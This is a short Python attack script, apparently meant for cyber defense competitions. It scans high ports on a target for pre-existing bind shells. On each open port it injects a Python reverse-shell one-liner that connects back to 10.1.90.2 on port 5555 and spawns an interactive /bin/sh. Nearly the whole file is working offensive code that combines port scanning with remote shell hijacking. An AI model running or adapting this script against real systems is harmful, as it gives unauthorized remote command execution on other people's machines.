'''
Many times in CDCs there are random bind shells on high ports.
This script will attempt to brute force which port the bind shell
is on and run a command if successful.
'''
import socket
import sys


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: python3 ' + sys.argv[0] + ' host')
        sys.exit(0)

    # Declare some colors to use
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    blue = '\033[94m'
    end_color = '\033[0m'

    # Assign arguments to more meaningful variables
    host = sys.argv[1]

    for i in range(50000, 65535):
        # create a new socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        buffer = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.1.90.2\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"
        try:
            s.connect((host, i))
            print(green + "Winner {0} {1}".format(host, i) + end_color)
            print(blue + "Go get your Shellz!" + end_color)
            s.send(buffer.encode())

            data = s.recv(1024)

            print(data)
            s.close()

        except socket.error as e:
            print(red + "{0} {1} ".format(host, i) + str(e) + end_color)

